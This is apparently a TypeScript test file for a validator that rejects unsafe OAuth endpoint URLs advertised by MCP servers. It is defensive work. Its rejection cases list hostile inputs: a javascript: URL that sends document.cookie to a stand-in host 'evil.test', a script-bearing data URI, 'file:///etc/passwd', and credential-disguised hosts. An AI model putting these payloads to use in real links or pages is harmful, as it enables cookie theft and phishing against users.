import { describe, expect, it } from "vitest";
import {
  checkOAuthEndpointUrl,
  isSafeOAuthEndpointUrl,
  oauthEndpointDisplayHost,
  oauthEndpointUrlRejectionMessage,
} from "./oauth-endpoint-url.js";

describe("checkOAuthEndpointUrl", () => {
  it("accepts an https endpoint and returns its normalized url and host", () => {
    const check = checkOAuthEndpointUrl("https://auth.example.test/oauth/authorize?prompt=consent");
    expect(check).toEqual({
      ok: true,
      url: "https://auth.example.test/oauth/authorize?prompt=consent",
      host: "auth.example.test",
    });
  });

  it("keeps a non-default port in the displayed host", () => {
    const check = checkOAuthEndpointUrl("https://auth.example.test:8443/authorize");
    expect(check.ok && check.host).toBe("auth.example.test:8443");
  });

  // The values a hostile MCP server would advertise to get code running in the
  // board's origin or to read a local file.
  it.each([
    ["javascript:alert(document.cookie)", "unsupported_scheme"],
    ["javascript:fetch('https://evil.test/'+document.cookie)", "unsupported_scheme"],
    ["data:text/html,<script>alert(1)</script>", "unsupported_scheme"],
    ["file:///etc/passwd", "unsupported_scheme"],
    ["vbscript:msgbox(1)", "unsupported_scheme"],
    ["about:blank", "unsupported_scheme"],
    ["blob:https://auth.example.test/1234", "unsupported_scheme"],
    ["chrome://settings", "unsupported_scheme"],
  ])("rejects %s", (value, reason) => {
    expect(checkOAuthEndpointUrl(value)).toEqual({ ok: false, reason });
    expect(isSafeOAuthEndpointUrl(value)).toBe(false);
  });

  it("rejects a scheme that only differs by case or padding", () => {
    expect(checkOAuthEndpointUrl("  JavaScript:alert(1)  ").ok).toBe(false);
    expect(checkOAuthEndpointUrl("JAVASCRIPT:alert(1)")).toEqual({ ok: false, reason: "unsupported_scheme" });
  });

  it("rejects plaintext http by default, loopback included", () => {
    expect(checkOAuthEndpointUrl("http://auth.example.test/authorize")).toEqual({
      ok: false,
      reason: "insecure_transport",
    });
    expect(checkOAuthEndpointUrl("http://127.0.0.1:9000/authorize")).toEqual({
      ok: false,
      reason: "insecure_transport",
    });
  });

  it("allows loopback http only under the local-development policy", () => {
    const options = { allowInsecureLoopback: true };
    for (const value of [
      "http://localhost:3100/authorize",
      "http://app.localhost:3100/authorize",
      "http://127.0.0.1:3100/authorize",
      "http://127.9.9.9:3100/authorize",
      "http://[::1]:3100/authorize",
    ]) {
      expect(checkOAuthEndpointUrl(value, options).ok, value).toBe(true);
    }
  });

  it("still rejects non-loopback http under the local-development policy", () => {
    for (const value of [
      "http://auth.example.test/authorize",
      "http://10.0.0.5/authorize",
      // Hosts that only *look* loopback.
      "http://127.0.0.1.evil.test/authorize",
      "http://localhost.evil.test/authorize",
      "http://notlocalhost/authorize",
    ]) {
      expect(checkOAuthEndpointUrl(value, { allowInsecureLoopback: true }), value).toEqual({
        ok: false,
        reason: "insecure_transport",
      });
    }
  });

  it("allows plaintext http for Paperclip's own origin only", () => {
    const options = { allowInsecureOrigins: ["http://paperclip.test"] };
    expect(checkOAuthEndpointUrl("http://paperclip.test/api/smoke-lab/oauth/authorize", options).ok).toBe(true);
    // Port and scheme are part of the origin, so a neighbour is not exempt.
    expect(checkOAuthEndpointUrl("http://paperclip.test:8080/authorize", options)).toEqual({
      ok: false,
      reason: "insecure_transport",
    });
    expect(checkOAuthEndpointUrl("http://evil.test/authorize", options)).toEqual({
      ok: false,
      reason: "insecure_transport",
    });
    // The exemption is about transport only: an unsafe scheme is still unsafe.
    expect(checkOAuthEndpointUrl("javascript:alert(1)", options)).toEqual({
      ok: false,
      reason: "unsupported_scheme",
    });
    // A garbage entry in the exemption list cannot open anything up.
    expect(checkOAuthEndpointUrl("http://paperclip.test/authorize", { allowInsecureOrigins: ["nonsense"] })).toEqual({
      ok: false,
      reason: "insecure_transport",
    });
  });

  it("rejects embedded credentials that disguise the real origin", () => {
    expect(checkOAuthEndpointUrl("https://accounts.google.com@evil.test/authorize")).toEqual({
      ok: false,
      reason: "embedded_credentials",
    });
    expect(checkOAuthEndpointUrl("https://user:pw@auth.example.test/authorize")).toEqual({
      ok: false,
      reason: "embedded_credentials",
    });
  });

  it("rejects a fragment", () => {
    expect(checkOAuthEndpointUrl("https://auth.example.test/authorize#/../../evil")).toEqual({
      ok: false,
      reason: "fragment",
    });
  });

  it("rejects malformed and empty values", () => {
    expect(checkOAuthEndpointUrl("/authorize")).toEqual({ ok: false, reason: "malformed" });
    expect(checkOAuthEndpointUrl("not a url")).toEqual({ ok: false, reason: "malformed" });
    expect(checkOAuthEndpointUrl("https://")).toEqual({ ok: false, reason: "malformed" });
    // A special scheme with no authority is re-parsed by WHATWG as a hostname,
    // so it lands on the transport rule rather than being treated as relative.
    expect(checkOAuthEndpointUrl("http:relative", { allowInsecureLoopback: true })).toEqual({
      ok: false,
      reason: "insecure_transport",
    });
    expect(checkOAuthEndpointUrl("")).toEqual({ ok: false, reason: "missing" });
    expect(checkOAuthEndpointUrl("   ")).toEqual({ ok: false, reason: "missing" });
    expect(checkOAuthEndpointUrl(null)).toEqual({ ok: false, reason: "missing" });
    expect(checkOAuthEndpointUrl({ href: "https://auth.example.test" })).toEqual({
      ok: false,
      reason: "missing",
    });
  });
});

describe("oauthEndpointUrlRejectionMessage", () => {
  it("names the endpoint without echoing the untrusted value", () => {
    const message = oauthEndpointUrlRejectionMessage("authorization", "unsupported_scheme");
    expect(message).toContain("sign-in");
    expect(message).toContain("https");
    expect(message).not.toContain("javascript");
  });

  it("covers every rejection reason for every endpoint kind", () => {
    for (const kind of ["authorization", "token", "registration", "metadata"] as const) {
      for (const reason of [
        "missing",
        "malformed",
        "unsupported_scheme",
        "insecure_transport",
        "embedded_credentials",
        "fragment",
      ] as const) {
        expect(oauthEndpointUrlRejectionMessage(kind, reason).length, `${kind}/${reason}`).toBeGreaterThan(0);
      }
    }
  });
});

describe("oauthEndpointDisplayHost", () => {
  it("returns the host for display", () => {
    expect(oauthEndpointDisplayHost("https://auth.example.test/authorize?x=1")).toBe("auth.example.test");
    expect(oauthEndpointDisplayHost("https://auth.example.test:8443/authorize")).toBe("auth.example.test:8443");
  });

  it("returns null for a value with no host", () => {
    expect(oauthEndpointDisplayHost("javascript:alert(1)")).toBeNull();
    expect(oauthEndpointDisplayHost("nonsense")).toBeNull();
    expect(oauthEndpointDisplayHost(null)).toBeNull();
  });
});
